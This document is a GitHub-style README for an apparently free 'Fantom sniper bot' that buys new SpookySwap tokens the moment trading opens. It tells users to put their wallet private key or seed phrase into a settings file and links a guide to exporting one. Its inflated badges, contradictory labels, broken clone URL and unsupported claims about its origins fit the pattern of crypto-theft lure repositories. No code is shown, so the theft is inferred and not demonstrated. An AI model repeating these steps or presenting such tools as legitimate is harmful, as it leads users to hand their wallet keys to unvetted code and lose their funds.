<h2 align="center">⭐️ FANTOM SNIPER (SpookySwap) BOT 2023-V2 (MAC WINDOWS ANDROID LINUX)⭐️ </h2> 
     
<h3 align="center">⭐️ First SNIPER BOT on FANTOM CHAIN for MAC & ANDROID & WINDOWS with honeypot detector ⭐️</h3>
 
![alt text](https://github.com/seeememagaiin/FANTOM_SNIPER_BOT_2022-WIN-MAC-LINUX-ANDROID/blob/main/FTMSC.png?raw=true "GIF application")")

[![Version](https://img.shields.io/badge/Codename-WHITEHAT-blue.svg?maxAge=259200)]() 
[![Stage](https://img.shields.io/badge/Release-Stable-brightgreen.svg)]()
[![Build](https://img.shields.io/badge/Supported_OS-MAC-red.svg)]()
[![Available](https://img.shields.io/badge/Available-WIN-yellow.svg?maxAge=259200)]()
[![Documentation](https://img.shields.io/badge/BSC-SNIPER-red.svg?maxAge=259200)]()
[![Contributions Welcome](https://img.shields.io/badge/Type-FREE-green.svg?style=flat)]()
     
       
<h3 align="center">⭐️ Support FTM ⭐️</h3>

![alt text](https://github.com/seeememagaiin/FANTOM_SNIPER_BOT_2022-WIN-MAC-LINUX-ANDROID/blob/main/FTMSC2.png?raw=true "GIF application")")
   
 
#### FTM SNIPER protocol is developed based on awesome open source research by Zcash team with the help of amazing Ethereum community
#### Web3  Sniper & honeypot detector Take Profit/StopLose bot written in python3, For ANDROID WIN MAC & LINUX
#### Sniper bot that watches when taxes/anti buy are removed from a contract, then quick snipes, with honeypot detector, and also keybinding for fair launches





# Install
First of all, you need install Python3+
Run on Android you need Install [Termux](https://termux.com/) only from F-Droid works atm. 
```shell
termux: 
$ pkg install python git cmake 
Debian/Ubuntu: 
$ sudo apt install python3 git cmake gcc
Windows:
You Need to install Visual Studio BuildTools & Python3
```


<H2>HOW TO USE</H2>
### Setup your Address and secret key in Settings.json and Run sniper.py

#### Setup your wallet Address and private key in Settings.json
1. An ethereum/FTM address.
2. Open "Settings.json" (with notepad) on line 2 and 3 add wallet address and phrase or private key.
3. Run python3 sniper.py
 
(Also you can use phrase key just use space between words)

<H2>How Find Private Key</H2>
https://metamask.zendesk.com/hc/en-us/articles/360015289632-How-to-Export-an-Account-Private-Key

Clone Repo:  
```shell
git clone https://github.com/FANTOM_SNIPER_BOT_2022-WIN-MAC-LINUX-ANDROID
cd FANTOM_SNIPER_BOT_2022-WIN-MAC-LINUX-ANDROID
```

Install Requirements:  
```python
python -m pip install -r requirements.txt
```  


Start Sniper:  
```python
python Sniper.py -t <TOKEN_ADDRESS> -a <AMOUNT> -tx <TXAMOUNT> -hp -wb <BLOCKS WAIT BEFORE BUY> -tp <TAKE PROFIT IN PERCENT> -sl <STOP LOSE IN PERCENT>
python Sniper.py -t SpookySwap0x04068da6c83afcfa0e13ba15a6696662335d5b75 -a 0.001 -tx 2 -hp  -wb 10 -tp 50
python Sniper.py -t SpookySwap0x04068da6c83afcfa0e13ba15a6696662335d5b75 --sellonly
python Sniper.py -t SpookySwap0x04068da6c83afcfa0e13ba15a6696662335d5b75 -a 0.001 --buyonly
python Sniper.py -t SpookySwap0x04068da6c83afcfa0e13ba15a6696662335d5b75 -tsl 10 -nb
```  

Here are all options with infos:  
```python3
*'-t' or '--token', Token for snipe e.g. "-t SpookySwap0x04068da6c83afcfa0e13ba15a6696662335d5b75"
'-a' or '--amount', float, Amount in FTM to snipe e.g. "-a 0.1"

'-tx' or '--txamount', how mutch tx you want to send? It split your FTM amount in e.g. "-tx 5"

'-wb' or '--awaitBlocks', default=0, Await Blocks before sending BUY Transaction. e.g. "-ab 50" 

'-hp' or '--honeypot', if you use this Flag, your token get checks if token is honypot before buy!

'-nb' or '--nobuy', No Buy, Skipp buy, if you want to use only TakeProfit/StopLoss/TrailingStopLoss
'-tp' or '--takeprofit', Percentage TakeProfit from your input FTM amount. e.g. "-tp 50" 
'-sl' or '--stoploss', Percentage StopLoss from your input FTM amount. e.g. "-sl 50" 
'-tsl'or '--trailingstoploss', 'Percentage Trailing-Stop-loss from your first Quote "-tsl 50"

'-so' or '--sellonly', Sell ALL your Tokens from given token address
'-bo' or '--buyonly', Buy Tokens with your given amount

* = require every time its runs!
```

## Trailing-Stop-Loss:
<img src="https://i.ytimg.com/vi/dZFb0-fwqOk/maxresdefault.jpg" height="400">
